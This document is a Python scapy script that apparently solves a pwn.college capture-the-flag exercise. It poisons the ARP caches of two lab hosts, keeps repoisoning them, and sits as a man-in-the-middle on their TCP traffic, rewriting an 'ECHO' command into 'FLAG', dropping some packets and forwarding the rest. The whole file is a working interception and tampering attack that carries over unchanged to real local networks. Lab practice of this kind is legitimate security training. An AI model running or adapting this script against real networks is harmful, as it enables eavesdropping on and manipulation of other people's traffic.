#!/usr/bin/env python

from scapy.all import *
import re

commands_r = re.compile(r"COMMANDS")
flag_r = re.compile(r"pwn.college{.*}")

iface='eth0'
smac = 'ca:2f:5a:dd:2f:28'
tmac = '66:78:87:f6:0a:0a'
fmac = '12:33:dd:76:f3:4a'
tip = '10.0.0.3'
fip = '10.0.0.4'
flag = None

conf.route.resync()
conf.checkIPaddr = False
conf.checkIPsrc = False

e1 = Ether(src=tmac, dst=fmac)
e2 = Ether(src=fmac, dst=tmac)
i1 = ARP(op=2, psrc=tip, pdst=fip, hwdst=fmac, hwsrc=smac)
i2 = ARP(op=2, psrc=fip, pdst=tip, hwdst=tmac, hwsrc=smac)
p1 = e1/i1
p2 = e2/i2

def arpcachepoison(
    target,  # type: Union[str, List[str]]
    addresses,  # type: Union[str, Tuple[str, str], List[Tuple[str, str]]]
    interval=15,  # type: int
):
    # type: (...) -> None
    """Poison targets' ARP cache
    :param target: Can be an IP, subnet (string) or a list of IPs. This lists the IPs
                   or subnets that will be poisoned.
    :param addresses: Can be either a string, a tuple of a list of tuples.
                      If it's a string, it's the IP to usurpate in the victim,
                      with the local interface's MAC. If it's a tuple,
                      it's ("IP", "MAC"). It it's a list, it's [("IP", "MAC")]
    Examples for target "192.168.0.2"::
        >>> arpcachepoison("192.168.0.2", "192.168.0.1")
        >>> arpcachepoison("192.168.0.1/24", "192.168.0.1")
        >>> arpcachepoison(["192.168.0.2", "192.168.0.3"], "192.168.0.1")
        >>> arpcachepoison("192.168.0.2", ("192.168.0.1", get_if_hwaddr("virbr0")))
        >>> arpcachepoison("192.168.0.2", [("192.168.0.1", get_if_hwaddr("virbr0"),
        ...                                ("192.168.0.2", "aa:aa:aa:aa:aa:aa")])
    """
    if isinstance(target, str):
        targets = Net(target)  # type: Union[Net, List[str]]
        str_target = target
    else:
        targets = target
        str_target = target[0]
    if isinstance(addresses, str):
        couple_list = [(addresses, get_if_hwaddr(conf.route.route(str_target)[0]))]
    elif isinstance(addresses, tuple):
        couple_list = [addresses]
    else:
        couple_list = addresses
    p = [
        Ether(src=y) / ARP(op="who-has", psrc=x, pdst=targets,
                           hwsrc=y, hwdst="ff:ff:ff:ff:ff:ff")
        for x, y in couple_list
    ]
    # try:
    #     while True:
    sendp(p, iface_hint=str_target)
    #         time.sleep(interval)
    # except KeyboardInterrupt:
    #     pass

print("Starting ARP cache poison")
arpcachepoison([tip, fip], [(tip, smac), (fip, smac)])
while not flag:
    try:
        capture = sniff(iface="eth0", count=1)
        capture.summary()
        c = capture[0]
        drop = False
        # respond to who-has with arp_spoof
        if c.haslayer('ARP'):
            if c[ARP].op == 1 and c[Ether].src == tmac:
                print("Repoisoning...")
                arpcachepoison([tip, fip], [(tip, smac), (fip, smac)])
            elif c[ARP].op == 1 and c[Ether].src == fmac:
                print("Repoisoning...")
                arpcachepoison([tip, fip], [(tip, smac), (fip, smac)])
        elif c[Ether].dst == smac:
            print("We have MITM!")
        else:
            print("Uh oh, we do not have MITM. Repoisoning...")
            arpcachepoison([tip, fip], [(tip, smac), (fip, smac)])
        p = c.copy()
        if p.haslayer('TCP'):
            if p.haslayer('Raw'):
                bytestring = p['Raw'].load
                print(bytestring)
                if bytestring == b'ECHO\n':
                    print("Spoofing ECHO")
                    p['Raw'].load = b'FLAG\n'
                if bytestring == b'Hello, World!\n':
                    print("Dropping Hello, World!")
                    drop = True
        if drop is False:
            # check if packet is from tip or fip
            if p[Ether].src == tmac:
                # change mac to spoofed mac
                p[Ether].src = smac
                p[Ether].dst = fmac
                del p['TCP'].chksum
                p = p.__class__(bytes(p))
                # send packet
                sendp(p, iface=iface, verbose=0)
            elif p[Ether].src == fmac:
                # change mac to spoofed mac
                p[Ether].src = smac
                p[Ether].dst = tmac
                del p['TCP'].chksum
                p = p.__class__(bytes(p))
                # send packet
                sendp(p, iface=iface, verbose=0)
    except IndexError:
        pass